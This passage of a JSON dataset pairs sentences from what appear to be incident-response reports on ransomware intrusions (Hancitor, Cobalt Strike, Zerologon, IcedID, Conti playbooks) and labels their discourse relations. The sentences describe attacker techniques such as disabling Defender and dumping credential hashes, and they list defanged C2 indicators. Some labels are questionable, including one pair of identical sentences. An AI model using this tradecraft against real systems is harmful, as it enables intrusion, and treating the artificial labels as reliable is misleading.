        "S2": "After encryption completed, the systems were rebooted and left with the following screen: The threat actors left their note requesting 8,000 USD on a domain controller which was not rebooted or locked out.",
        "relation": "NEXT"
    },
    {
        "S1": "They then manually executed the script which disables the event log service, enables BitLocker (and RDP), prepares system drive using BdeHdCfg (a BitLocker drive encryption preparation tool), restarts the system, and deletes itself.",
        "S2": "Running this script on servers made them inaccessible, and the following BitLocker encryption message was shown when restarted:",
        "relation": "NEXT"
    },
    {
        "S1": "Running this script on servers made them inaccessible, and the following BitLocker encryption message was shown when restarted:",
        "S2": "We are unsure why DiskCrypter was used on workstations but we believe it may have something to do with not all workstation versions supporting BitLocker.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Running this script on servers made them inaccessible, and the following BitLocker encryption message was shown when restarted:",
        "S2": "This executable, however, reminds you on install that it is \u201cbeta\u201d software.",
        "relation": "MISC"
    },
    {
        "S1": "Like with many infections today, the threat actors gained initial access on a system through a malicious document email campaign, which made use of the Hancitor downloader.",
        "S2": "The Hancitor dll downloaded and executed multiple payloads including a Cobalt Strike stager and Ficker Stealer.",
        "relation": "NEXT"
    },
    {
        "S1": "Like with many infections today, the threat actors gained initial access on a system through a malicious document email campaign, which made use of the Hancitor downloader.",
        "S2": "The threat actors then began port scanning for SMB and a few backup systems such as Synology, Veeam and Backup Exec.",
        "relation": "NEXT"
    },
    {
        "S1": "The Hancitor dll downloaded and executed multiple payloads including a Cobalt Strike stager and Ficker Stealer.",
        "S2": "Upon the user enabling macros, a Hancitor dll was executed, which called the usual suspect, Cobalt Strike.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Hancitor dll downloaded and executed multiple payloads including a Cobalt Strike stager and Ficker Stealer.",
        "S2": "Cobalt Strike beacons were deployed to each server to facilitate remote access.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors then began port scanning for SMB and a few backup systems such as Synology, Veeam and Backup Exec.",
        "S2": "They then checked access to remote systems by connecting to the C$ share.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors proceeded to move laterally to multiple other servers on the network by making use of existing local administrative rights of a compromised user.",
        "S2": "Furthermore, the threat actors dropped an obfuscated PowerShell script on one of the machines to further their access.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors proceeded to move laterally to multiple other servers on the network by making use of existing local administrative rights of a compromised user.",
        "S2": "Once on these systems, additional scanning occurred using a binary called check.exe that ran ICMP sweeps across the network.",
        "relation": "MISC"
    },
    {
        "S1": "Cobalt Strike beacons were deployed to each server to facilitate remote access.",
        "S2": "The threat actors then pivoted to the two domain controllers and deployed Cobalt Strike beacons.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Furthermore, the threat actors dropped an obfuscated PowerShell script on one of the machines to further their access.",
        "S2": "Next, the threat actors used a custom implementation of the Zerologon (CVE-2020-1472) exploit (zero.exe) against one of the domain controllers.",
        "relation": "MISC"
    },
    {
        "S1": "Next, the threat actors used a custom implementation of the Zerologon (CVE-2020-1472) exploit (zero.exe) against one of the domain controllers.",
        "S2": "The threat actors then pivoted to the two domain controllers and deployed Cobalt Strike beacons.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors continued pivoting to key systems including additional domain controllers, backup servers, and file shares, using Cobalt Strike.",
        "S2": "The Cobalt Strike servers in this case were added to the Threat Feed on 5/16 and 7/15 .",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors continued pivoting to key systems including additional domain controllers, backup servers, and file shares, using Cobalt Strike.",
        "S2": "Within two hours of the initial malicious document execution, the threat actors had a foothold on all key systems in the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Once on these systems, additional scanning occurred using a binary called check.exe that ran ICMP sweeps across the network.",
        "S2": "We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.",
        "relation": "MISC"
    },
    {
        "S1": "Similar to a previous case, the threat actors were evicted before completing their mission and as a result their final actions could not be observed.",
        "S2": "Similar to a previous case , the threat actors were evicted before completing their mission and as a result their final actions could not be observed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.",
        "S2": "We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, BazarLoader, etc.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Cobalt Strike servers in this case were added to the Threat Feed on 5/16 and 7/15 .",
        "S2": "Various different enumeration and lateral movement tactics were observed on the network, along with the exploitation of Zerologon to elevate to domain administrator and gain full control over the domain.",
        "relation": "MISC"
    },
    {
        "S1": "We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, BazarLoader, etc.",
        "S2": "Three files were downloaded by Hancitor from 4a5ikol[.]ru (8.211.241.0) including two Cobalt Strike stagers and Ficker Stealer.",
        "relation": "MISC"
    },
    {
        "S1": "Similar to a previous case , the threat actors were evicted before completing their mission and as a result their final actions could not be observed.",
        "S2": "The threat actors were scanning for backup products such as Synology, Backup Exec and Veeam.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor was able to go from zero access to domain admin, in just under one hour.",
        "S2": "The threat actor made use of a custom developed implementation of Zerologon (CVE-2020-1472) executed from a file named \u201czero.exe\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "Reviewing the document we can see the expected malicious macro and identify the location of a dll to be dropped in the:",
        "S2": "And once the dll \u201cier\u201d is written there, the macro proceeds to execute it.",
        "relation": "NEXT"
    },
    {
        "S1": "Reviewing the document we can see the expected malicious macro and identify the location of a dll to be dropped in the:",
        "S2": "Discovery started with a port scan initiated by the Hancitor dll.",
        "relation": "MISC"
    },
    {
        "S1": "Hancitor then launched multiple instances of svchost.exe and process injected them with Cobalt Strike.",
        "S2": "Lastly, a Cobalt Strike command and control server was pinged before they copied the Cobalt Strike DLL and batch file, which were used to facilitate lateral movement.",
        "relation": "NEXT"
    },
    {
        "S1": "The following diagram shows the initial execution process from the WINWORD.exe to the Cobalt Strike Beacons that were injected into memory by Hancitor.",
        "S2": "Hancitor contacted its servers over HTTP and advertised details about the compromised machine, user, and domain while also retrieving instructions from the command and control server (1).",
        "relation": "MISC"
    },
    {
        "S1": "Lastly, a Cobalt Strike command and control server was pinged before they copied the Cobalt Strike DLL and batch file, which were used to facilitate lateral movement.",
        "S2": "Moreover, the Cobalt Strike DLL stager was executed with a specific command line parameter which is used as a sandbox evasion feature.",
        "relation": "MISC"
    },
    {
        "S1": "The batch file (cor.bat) is a 3-line script that will execute the Cobalt Strike DLL using rundll32.exe with a specific parameter.",
        "S2": "A program named check.exe was observed using the comps.txt text file.",
        "relation": "MISC"
    },
    {
        "S1": "Once \u201czero.exe\u201d is run it will provide the threat actor with the NTLM hash of the specified username, a Domain Administrator account in this case.",
        "S2": "Upon Hancitor launching on the system, it process injected into multiple instances of svchost.exe and rundll32.exe.",
        "relation": "MISC"
    },
    {
        "S1": "Once \u201czero.exe\u201d is run it will provide the threat actor with the NTLM hash of the specified username, a Domain Administrator account in this case.",
        "S2": "Zerologon will create an Event ID 4624 for the domain controller computer account attempting to authenticate.",
        "relation": "NEXT"
    },
    {
        "S1": "On the Domain Controller a service (Event ID 7045) will be created that will run the Reset-ComputerMachinePassword PowerShell Cmdlet.",
        "S2": "The main red flag is the source network address IP differing from the IP of the domain controller, which in this case is set to the beachhead workstation on which zero.exe was executed.",
        "relation": "MISC"
    },
    {
        "S1": "The main red flag is the source network address IP differing from the IP of the domain controller, which in this case is set to the beachhead workstation on which zero.exe was executed.",
        "S2": "This is most likely instructions that the previously discussed PE file retrieved from the remote command and control server.",
        "relation": "MISC"
    },
    {
        "S1": "Upon Hancitor launching on the system, it process injected into multiple instances of svchost.exe and rundll32.exe.",
        "S2": "Anomalous parent and child process relationships can be seen on the system that Hancitor was executed on, including rundll32.exe spawning svchost.exe and svchost.exe spawning cmd.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Upon Hancitor launching on the system, it process injected into multiple instances of svchost.exe and rundll32.exe.",
        "S2": "The only credential access observed was through Zerologon, which was used to retrieve the domain administrator\u2019s NTLM hash.",
        "relation": "MISC"
    },
    {
        "S1": "Anomalous parent and child process relationships can be seen on the system that Hancitor was executed on, including rundll32.exe spawning svchost.exe and svchost.exe spawning cmd.exe.",
        "S2": "Discovery started with a port scan initiated by the Hancitor dll.",
        "relation": "MISC"
    },
    {
        "S1": "Moreover, the Cobalt Strike DLL stager was executed with a specific command line parameter which is used as a sandbox evasion feature.",
        "S2": "Notice above, the threat actors pinged 190.114.254[.]116 which is one of the Cobalt Strike servers they later used.",
        "relation": "MISC"
    },
    {
        "S1": "Lastly, a PowerShell loader named agent1.ps1 used heavy obfuscation to conceal the execution flow and hide the final shellcode.",
        "S2": "The shellcode is responsible for loading a PE file into memory and calling out to 64.235.39[.]32 for further instructions.",
        "relation": "NEXT"
    },
    {
        "S1": "Discovery started with a port scan initiated by the Hancitor dll.",
        "S2": "The threat actors enumerated local administrative access on remote systems by checking access to the C$ share for hosts discovered after the port scan.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After SMB was scanned we saw scans of 5000/tcp, 9392/tcp, 6106/tcp.",
        "S2": "We observed a PowerShell script named comp2.ps1 that was executed on every Domain Controller in the environment.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors were scanning for backup products such as Synology, Backup Exec and Veeam.",
        "S2": "Notice above, the threat actors pinged 190.114.254[.]116 which is one of the Cobalt Strike servers they later used.",
        "relation": "MISC"
    },
    {
        "S1": "Notice above, the threat actors pinged 190.114.254[.]116 which is one of the Cobalt Strike servers they later used.",
        "S2": "From another dedicated location, 4a5ikol[.]ru, two Cobalt Strike beacons and Ficker Stealer malware were downloaded through HTTP (2).",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors enumerated local administrative access on remote systems by checking access to the C$ share for hosts discovered after the port scan.",
        "S2": "The threat actors pivoted towards multiple hosts on the domain from the beachhead.",
        "relation": "MISC"
    },
    {
        "S1": "A program named check.exe was observed using the comps.txt text file.",
        "S2": "The online hosts will then be directed to the check.txt text file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This program will take a list of IP addresses and hostnames from comps.txt and check if they are online using ICMP.",
        "S2": "check .exe comps.txt check .txt -ip ( Check which hosts in comps.txt are alive, and write the IP to check .txt) check .exe comps.txt check .txt - name ( Check which hosts in comps.txt are alive, and write the hostname to check .txt) check .exe comps.txt check .txt - full ( Check which hosts in comps.txt are alive, and write the IP and hostname to check .txt)",
        "relation": "ELABORATION"
    },
    {
        "S1": "The main actions involved copying a Cobalt Strike DLL beacon and a batch script to run the DLL (cor.dll, cor.bat, GAS.dll, GAS.bat).",
        "S2": "The following shows one of the batch scripts used to run a Cobalt Strike payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The PowerShell script had instructions to deobfuscate shellcode and run it in memory as a thread in the same PowerShell process.",
        "S2": "You can see this from the memory dump MZ header denoting the PE binary loaded into the PowerShell process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Once the shellcode is running this PE file will be loaded into memory and executed.",
        "S2": "The PE file is of a small size and has the capability to beacon out at regular intervals to a command-and-control server on 64.235.39[.]32 to retrieve instructions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The PE file is of a small size and has the capability to beacon out at regular intervals to a command-and-control server on 64.235.39[.]32 to retrieve instructions.",
        "S2": "This is most likely instructions that the previously discussed PE file retrieved from the remote command and control server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is most likely instructions that the previously discussed PE file retrieved from the remote command and control server.",
        "S2": "Lastly, the shellcode executed by the agent1.ps1 PowerShell loader, was observed loading a PE file into memory that would beacon out at consistent intervals to 64.235.39[.]32.",
        "relation": "ELABORATION"
    },
    {
        "S1": "From another dedicated location, 4a5ikol[.]ru, two Cobalt Strike beacons and Ficker Stealer malware were downloaded through HTTP (2).",
        "S2": "Cobalt Strike was also observed to be making use of HTTP.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As with most commodity malware we see, IcedID executes the initial discovery commands and then exfiltrates the results via the C2 channel.",
        "S2": "In this instance, the threat actors instructed IcedID to download and execute the next stage malware two hours after the initial compromise.",
        "relation": "ELABORATION"
    },
    {
        "S1": "If threat actors find the organization to be of interest, they will launch the next phase.",
        "S2": "In this instance, the threat actors instructed IcedID to download and execute the next stage malware two hours after the initial compromise.",
        "relation": "MISC"
    },
    {
        "S1": "In some cases, there might be different threat actor groups working on different phases of the attack.",
        "S2": "The attacker\u2019s preferred scripting various parts of the intrusion via batch scripts.",
        "relation": "MISC"
    },
    {
        "S1": "Upon initial execution, Cobalt Strike ran some discovery commands before injecting into the LSASS process to steal cached credentials.",
        "S2": "Once the domain controllers were identified, they used Cobalt Strike\u2019s \u201cjump psexec_psh\u201d capability, which creates a Windows service that executes a Beacon executable to move laterally.",
        "relation": "NEXT"
    },
    {
        "S1": "Having gained access to the domain controllers, the attackers downloaded and executed AdFind to collect further information about the domain.",
        "S2": "This persistence mechanism was only seen on the domain controllers and one other critical server.",
        "relation": "NEXT"
    },
    {
        "S1": "The attacker\u2019s preferred scripting various parts of the intrusion via batch scripts.",
        "S2": "Three hours into the intrusion and the attackers had deployed Beacons across various hosts on the network.",
        "relation": "MISC"
    },
    {
        "S1": "They had a script for persistence, defense evasion and execution tasks.",
        "S2": "Three hours into the intrusion and the attackers had deployed Beacons across various hosts on the network.",
        "relation": "MISC"
    },
    {
        "S1": "It is worth mentioning that it appears they chose which hosts to pivot to by assessing the importance implied by their hostnames.",
        "S2": "At the same time, the operators performed an exhaustive port scan on the servers they had earlier identified to be \u201cimportant\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "Three hours into the intrusion and the attackers had deployed Beacons across various hosts on the network.",
        "S2": "Around 23 hours after the initial intrusion, the threat actors moved towards their final objective of deploying XingLocker ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "Despite that, they deployed another Beacon using a PowerShell loader method, this time on the beachhead.",
        "S2": "The deployment took place via wmic and batch scripts.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Despite that, they deployed another Beacon using a PowerShell loader method, this time on the beachhead.",
        "S2": "Initial IcedID was executed on the beachhead using regsvr32.exe",
        "relation": "MISC"
    },
    {
        "S1": "BloodHound was also executed as part their reconnaissance activities.",
        "S2": "Around 23 hours after the initial intrusion, the threat actors moved towards their final objective of deploying XingLocker ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "Around 23 hours after the initial intrusion, the threat actors moved towards their final objective of deploying XingLocker ransomware.",
        "S2": "We did not observe any overt exfiltration of data; however, it is possible that the threat actors used Cobalt Strike to transmit sensitive data.",
        "relation": "MISC"
    },
    {
        "S1": "Around 23 hours after the initial intrusion, the threat actors moved towards their final objective of deploying XingLocker ransomware.",
        "S2": "No exfiltration TTPs were observed while analyzing this intrusion, however, as stated in the case summary, it is possible that the threat actors used Cobalt Strike (encrypted channel) to transmit sensitive data such as Word documents.",
        "relation": "MISC"
    },
    {
        "S1": "We did not observe any overt exfiltration of data; however, it is possible that the threat actors used Cobalt Strike to transmit sensitive data.",
        "S2": "The threat actors connected to the machine to run the first discovery commands using Cobalt Strike Beacon.",
        "relation": "MISC"
    },
    {
        "S1": "We did not observe any overt exfiltration of data; however, it is possible that the threat actors used Cobalt Strike to transmit sensitive data.",
        "S2": "Upon the execution of the IcedID sample, we observed a download and execution of a malicious DLL ikaqkk.dll :",
        "relation": "MISC"
    },
    {
        "S1": "Initial IcedID was executed on the beachhead using regsvr32.exe",
        "S2": "Cobalt strike Beacon DLLHost.exe was downloaded and loaded via process hollowing a few hours after the initial IcedID execution:",
        "relation": "NEXT"
    },
    {
        "S1": "Initial IcedID was executed on the beachhead using regsvr32.exe",
        "S2": "The Threat actors also executed HTA and PowerShell loader to load Cobalt Strike Beacon in memory on beachhead:",
        "relation": "NEXT"
    },
    {
        "S1": "Upon the execution of the IcedID sample, we observed a download and execution of a malicious DLL ikaqkk.dll :",
        "S2": "The star.bat script contained the following lines in both cases:",
        "relation": "MISC"
    },
    {
        "S1": "Upon the execution of the IcedID sample, we observed a download and execution of a malicious DLL ikaqkk.dll :",
        "S2": "We also saw exhaustive port scanners of certain servers before additional discovery.",
        "relation": "MISC"
    },
    {
        "S1": "Upon the execution of the IcedID sample, we observed a download and execution of a malicious DLL ikaqkk.dll :",
        "S2": "The DLL was then executed using rundll32.exe one second later:",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors connected to the machine to run the first discovery commands using Cobalt Strike Beacon.",
        "S2": "The Threat actors also executed HTA and PowerShell loader to load Cobalt Strike Beacon in memory on beachhead:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Threat actors also executed HTA and PowerShell loader to load Cobalt Strike Beacon in memory on beachhead:",
        "S2": "The threat actors executed a 1698 line batch script kasper.bat on a file server, which kills multiple processes using taskill, stops/disables several services using net stop and sc config and disables a number of security tools using WMI.",
        "relation": "MISC"
    },
    {
        "S1": "The Threat actors also executed HTA and PowerShell loader to load Cobalt Strike Beacon in memory on beachhead:",
        "S2": "This scheduled task with name HpSupport executed a Cobalt Strike Beacon kaslose64.dll both on the Domain Controller and the File Server:",
        "relation": "MISC"
    },
    {
        "S1": "The new scheduled task was registered under EID 106 as seen below.",
        "S2": "Correlating this with Process Execution logs from MDE, shows that the task was executing the IcedID downloaded DLL:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Correlating this with Process Execution logs from MDE, shows that the task was executing the IcedID downloaded DLL:",
        "S2": "This scheduled task with name HpSupport executed a Cobalt Strike Beacon kaslose64.dll both on the Domain Controller and the File Server:",
        "relation": "MISC"
    },
    {
        "S1": "This scheduled task with name HpSupport executed a Cobalt Strike Beacon kaslose64.dll both on the Domain Controller and the File Server:",
        "S2": "IcedID reached out to 37.120.222[.]100:8080 to download and load Cobalt Strike Beacon via process hollowing technique:",
        "relation": "MISC"
    },
    {
        "S1": "IcedID reached out to 37.120.222[.]100:8080 to download and load Cobalt Strike Beacon via process hollowing technique:",
        "S2": "Related named pipe activity based on Cobalt Strike patterns for using Mimikatz Pass-The-Hash function to run local and remote commands.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors executed a 1698 line batch script kasper.bat on a file server, which kills multiple processes using taskill, stops/disables several services using net stop and sc config and disables a number of security tools using WMI.",
        "S2": "The threat actors executed three other scripts named fed1.bat , fed2.bat and fed3.bat using PowerShell and manipulating several registry keys to disable Windows Defender.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors executed three other scripts named fed1.bat , fed2.bat and fed3.bat using PowerShell and manipulating several registry keys to disable Windows Defender.",
        "S2": "It appears that the information from these 3 scripts were lifted from the first revision of Revisions \u00b7 quick-disable-windows-defender.bat \u00b7 GitHub.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors executed three other scripts named fed1.bat , fed2.bat and fed3.bat using PowerShell and manipulating several registry keys to disable Windows Defender.",
        "S2": "The threat actors injected into a high privileged process and then access cached credentials from LSASS:",
        "relation": "NEXT"
    },
    {
        "S1": "It appears that the information from these 3 scripts were lifted from the first revision of Revisions \u00b7 quick-disable-windows-defender.bat \u00b7 GitHub.",
        "S2": "This tells us that the threat actor was not aware of what was in these scripts or else they wouldn\u2019t have ran fed1/fed2 and fed3 considering they do the same thing.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Fed1 is half of that batch file and Fed2 is the other half.",
        "S2": "This tells us that the threat actor was not aware of what was in these scripts or else they wouldn\u2019t have ran fed1/fed2 and fed3 considering they do the same thing.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors injected into a high privileged process and then access cached credentials from LSASS:",
        "S2": "After discovering and pivoting to the Domain Controller, threat actors used both AdFind and BloodHound to explore the Active Directory Domain.",
        "relation": "MISC"
    },
    {
        "S1": "Related named pipe activity based on Cobalt Strike patterns for using Mimikatz Pass-The-Hash function to run local and remote commands.",
        "S2": "Cobalt Strike\u2019s appino Beacon, ran discovery commands upon initial execution:",
        "relation": "MISC"
    },
    {
        "S1": "The named pipe was used to pass the results back to the Beacon process.",
        "S2": "Cobalt Strike\u2019s appino Beacon, ran discovery commands upon initial execution:",
        "relation": "MISC"
    },
    {
        "S1": "Cobalt Strike\u2019s appino Beacon, ran discovery commands upon initial execution:",
        "S2": "The spoolsv.exe binary is a Cobalt Strike artifact used for Lateral Movement and C2 which decodes to the configuration below:",
        "relation": "NEXT"
    },
    {
        "S1": "After discovering and pivoting to the Domain Controller, threat actors used both AdFind and BloodHound to explore the Active Directory Domain.",
        "S2": "The threat actors also executed PowerView Invoke-ShareFinder module on the beachhead host:",
        "relation": "NEXT"
    },
    {
        "S1": "After discovering and pivoting to the Domain Controller, threat actors used both AdFind and BloodHound to explore the Active Directory Domain.",
        "S2": "Evidence of BloodHound execution on the Domain Controller:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors also executed PowerView Invoke-ShareFinder module on the beachhead host:",
        "S2": "The threat actors also executed PowerView Invoke-FindLocalAdminAccess module on one of the compromised servers:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors also executed PowerView Invoke-FindLocalAdminAccess module on one of the compromised servers:",
        "S2": "Additional Lateral Movement technique was observed, where the threat actors used Cobalt Strike\u2019s jump psexec_psh :",
        "relation": "MISC"
    },
    {
        "S1": "We also saw exhaustive port scanners of certain servers before additional discovery.",
        "S2": "Using Cyberchef (recipe), we decoded the obfuscated powershell loader, which is using the default named pipe \\.\\pipe\\status_f5 :",
        "relation": "MISC"
    },
    {
        "S1": "The first Lateral Movement to the Domain Controller was performed using remote services creation (Executing spoolsv.exe via remote services):",
        "S2": "Right after initial Lateral Movement, a second Cobalt Strike Beacon kaslose64.dll was executed on a critical server.",
        "relation": "NEXT"
    },
    {
        "S1": "Additional Lateral Movement technique was observed, where the threat actors used Cobalt Strike\u2019s jump psexec_psh :",
        "S2": "Threat actors also pivoted to a domain controller by using the same Cobalt Strike artifacts, spoolsv.exe via remote service creation:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Additional Lateral Movement technique was observed, where the threat actors used Cobalt Strike\u2019s jump psexec_psh :",
        "S2": "No exfiltration TTPs were observed while analyzing this intrusion, however, as stated in the case summary, it is possible that the threat actors used Cobalt Strike (encrypted channel) to transmit sensitive data such as Word documents.",
        "relation": "MISC"
    },
    {
        "S1": "Using Cyberchef (recipe), we decoded the obfuscated powershell loader, which is using the default named pipe \\.\\pipe\\status_f5 :",
        "S2": "The following Cobalt Strike server was added to our Threat Feed on 07/26/2021.",
        "relation": "MISC"
    },
    {
        "S1": "Right after initial Lateral Movement, a second Cobalt Strike Beacon kaslose64.dll was executed on a critical server.",
        "S2": "Beacon is the malware agent installed on the victim\u2019s device and is responsible for communicating with the C2 server.",
        "relation": "MISC"
    },
    {
        "S1": "Right after initial Lateral Movement, a second Cobalt Strike Beacon kaslose64.dll was executed on a critical server.",
        "S2": "The following Cobalt Strike server was added to our Threat Feed on 07/26/2021.",
        "relation": "MISC"
    },
    {
        "S1": "Rita is a framework for identifying command and control communication, also known as beaconing.",
        "S2": "Rita is consuming zeek/bro logs and detecting suspected beaconing activity using network traffic calculations.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Rita is utilized as a hunting tool rather than a real-time detection tool, though simple scripting allows Rita to be used for live traffic analysis.",
        "S2": "Rita can only identify suspicious communication and should not be automated as a preventative control.",
        "relation": "ELABORATION"
    },
    {
        "S1": "No exfiltration TTPs were observed while analyzing this intrusion, however, as stated in the case summary, it is possible that the threat actors used Cobalt Strike (encrypted channel) to transmit sensitive data such as Word documents.",
        "S2": "Once the encryption process was complete a file called RecoveryManual.html was left across the filesystem with the instructions on how to contact the threat actors for the ransom negotiations.",
        "relation": "NEXT"
    },
    {
        "S1": "We saw the BazarLoader process download and execute the first Cobalt Strike beacon twenty minutes later using rundll32.",
        "S2": "During interactive discovery tasks via the Cobalt Strike beacon, the threat actors attempted an unusual command that had us scratching our heads for awhile, \u201cav_query\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "During interactive discovery tasks via the Cobalt Strike beacon, the threat actors attempted an unusual command that had us scratching our heads for awhile, \u201cav_query\u201d.",
        "S2": "It is likely that the threat actors in this intrusion meant to use this aggressor script via their Cobalt Strike console, but instead typed or pasted \u201cav_query\u201d into their windows command prompt session.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During interactive discovery tasks via the Cobalt Strike beacon, the threat actors attempted an unusual command that had us scratching our heads for awhile, \u201cav_query\u201d.",
        "S2": "In these materials, we found a file called \u201cAVquery.cna\u201d that refers to a Cobalt Strike aggressor script for identifying AV on the target systems.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During interactive discovery tasks via the Cobalt Strike beacon, the threat actors attempted an unusual command that had us scratching our heads for awhile, \u201cav_query\u201d.",
        "S2": "Continuing with the discovery phase, the threat actors executed AdFind via a batch script before further enumerating using native Windows tools and port scanning via the Cobalt Strike beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "This left us confused, we were not aware of the reason and/or the purpose of this command.",
        "S2": "We demonstrated some of the documents on one of our recent tweet threads, more info about the Conti leak here.",
        "relation": "MISC"
    },
    {
        "S1": "This left us confused, we were not aware of the reason and/or the purpose of this command.",
        "S2": "We assess with medium to high confidence that the initial access was a result of malicious, macro-enabled, Word document that was sent as an attachment to the targets of a phishing campaign.",
        "relation": "MISC"
    },
    {
        "S1": "We demonstrated some of the documents on one of our recent tweet threads, more info about the Conti leak here.",
        "S2": "It is likely that the threat actors in this intrusion meant to use this aggressor script via their Cobalt Strike console, but instead typed or pasted \u201cav_query\u201d into their windows command prompt session.",
        "relation": "MISC"
    },
    {
        "S1": "In these materials, we found a file called \u201cAVquery.cna\u201d that refers to a Cobalt Strike aggressor script for identifying AV on the target systems.",
        "S2": "More specifically, we observed the threat actors copy/pasting the exact commands such as creating local admin users that contained the same passwords we saw in the leaked instructions.",
        "relation": "MISC"
    },
    {
        "S1": "In these materials, we found a file called \u201cAVquery.cna\u201d that refers to a Cobalt Strike aggressor script for identifying AV on the target systems.",
        "S2": "Additionally, threat actors were seen following the instructions of the leaked documents step by step.",
        "relation": "MISC"
    },
    {
        "S1": "It is likely that the threat actors in this intrusion meant to use this aggressor script via their Cobalt Strike console, but instead typed or pasted \u201cav_query\u201d into their windows command prompt session.",
        "S2": "Continuing with the discovery phase, the threat actors executed AdFind via a batch script before further enumerating using native Windows tools and port scanning via the Cobalt Strike beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "It is likely that the threat actors in this intrusion meant to use this aggressor script via their Cobalt Strike console, but instead typed or pasted \u201cav_query\u201d into their windows command prompt session.",
        "S2": "Typically, these types of cases end up with Conti ransomware, however, the threat actors were evicted from the network before a final suspected ransomware deployment commenced.",
        "relation": "NEXT"
    },
    {
        "S1": "It is likely that the threat actors in this intrusion meant to use this aggressor script via their Cobalt Strike console, but instead typed or pasted \u201cav_query\u201d into their windows command prompt session.",
        "S2": "The initial execution for this intrusion took place with the use of BazarLoader malware via rundll32.",
        "relation": "MISC"
    },
    {
        "S1": "More specifically, we observed the threat actors copy/pasting the exact commands such as creating local admin users that contained the same passwords we saw in the leaked instructions.",
        "S2": "Moments later, we observed them move laterally for the first time to the Domain Controller using RDP.",
        "relation": "NEXT"
    },
    {
        "S1": "Continuing with the discovery phase, the threat actors executed AdFind via a batch script before further enumerating using native Windows tools and port scanning via the Cobalt Strike beacon.",
        "S2": "Later on, hands-on operators carried out some additional network and domain reconnaissance from the Cobalt Strike beacon.",
        "relation": "MISC"
    },
    {
        "S1": "Continuing with the discovery phase, the threat actors executed AdFind via a batch script before further enumerating using native Windows tools and port scanning via the Cobalt Strike beacon.",
        "S2": "They also ran two separate Cobalt Strike beacons.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Moments later, we observed them move laterally for the first time to the Domain Controller using RDP.",
        "S2": "We assess with medium to high confidence that the initial access was a result of malicious, macro-enabled, Word document that was sent as an attachment to the targets of a phishing campaign.",
        "relation": "MISC"
    },
    {
        "S1": "Once on the Domain Controller, they again downloaded and executed AdFind through the same batch script.",
        "S2": "BazarLoader initial communication with the C2 is over HTTPS.",
        "relation": "MISC"
    },
    {
        "S1": "As if their presence was not enough with Cobalt Strike and administrator credentials, they proceeded with creating two local administrator accounts.",
        "S2": "Again, built in utilities were favored, with the exception of what we assess was a fat finger or miss-paste by the threat actor entering a command they meant to execute in their Cobalt Strike console into the windows command terminal.",
        "relation": "MISC"
    },
    {
        "S1": "After having four different types of persistence, they felt it was enough and continued enumerating the network, only this time, they searched for valuable documents across all domain-joined hosts.",
        "S2": "After four hours of downtime, the operators returned to the network and did something unexpected; they used seatbelt to enumerate the domain controller further.",
        "relation": "MISC"
    },
    {
        "S1": "To accomplish that, they used PowerSploit and, more specifically, the \u201cInvoke-ShareFinder\u201d module.",
        "S2": "They did the same thing later, on the second domain controller.",
        "relation": "MISC"
    },
    {
        "S1": "While waiting for their script to finish, the threat actors created a full backup of active directory in \u201cIFM\u201d media mode and dumped the password hashes along with the corresponding users.",
        "S2": "The next step for the threat actors was to download and run \u201cAdvanced IP Scanner\u201d and scanned for ranges looking for other active subnets on the LAN.",
        "relation": "MISC"
    },
    {
        "S1": "After four hours of downtime, the operators returned to the network and did something unexpected; they used seatbelt to enumerate the domain controller further.",
        "S2": "After almost a day of inactivity, the operators logged into the network and used RDP to remote into file servers that contained valuable data.",
        "relation": "NEXT"
    },
    {
        "S1": "They then pivoted over to another domain controller, repeated all the above discovery steps, and ran the same tools as on the first domain controller.",
        "S2": "Many hours after the initial compromise, we observed the threat actors using RDP to connect to the first domain controller.",
        "relation": "MISC"
    },
    {
